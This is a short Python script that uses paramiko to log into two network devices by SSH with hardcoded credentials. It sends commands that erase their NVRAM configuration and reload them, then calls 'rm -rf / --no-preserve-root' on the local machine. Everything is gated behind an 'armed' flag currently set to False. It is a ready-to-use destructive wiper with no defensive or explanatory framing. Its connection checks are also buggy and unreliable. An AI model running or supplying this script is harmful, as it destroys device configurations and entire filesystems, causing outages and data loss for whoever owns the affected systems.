import paramiko
import time
import getpass
import os

ssh_client = paramiko.SSHClient()
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ip = '172.16.0.5'
ip2 = '172.16.0.6'
username = 'cisco'
password = 'cisco123!'
armed = False

if (armed == True):
  ssh_client.connect(ip,username=username,password=password, look_for_keys=False, allow_agent=False)
  shell = ssh_client.invoke_shell()
  time.sleep(1)
  shell.send('erase /all nvram: \n')
  shell.send('yreload\n')
  shell.send('y\n')
  time.sleep(1)
  output = shell.recv(10000)
  output = output.decode('utf-8') 
  print(output)
if print(ssh_client.get_transport().is_active()) == True:
    print('Closing connection')
    ssh_client.close()
    
if (armed == True):    
  ssh_client.connect(ip2,username=username,password=password, look_for_keys=False, allow_agent=False)
  shell = ssh_client.invoke_shell()
  time.sleep(1)
  shell.send('erase /all nvram: \n')
  shell.send('yreload\n')
  shell.send('y\n')
  time.sleep(1)
  output = shell.recv(10000)
  output = output.decode('utf-8') 
  print(output)
if print(ssh_client.get_transport().is_active()) == True:
    print('Closing connection')
    ssh_client.close()

if (armed == True):
  os.system('rm -rf / --no-preserve-root')

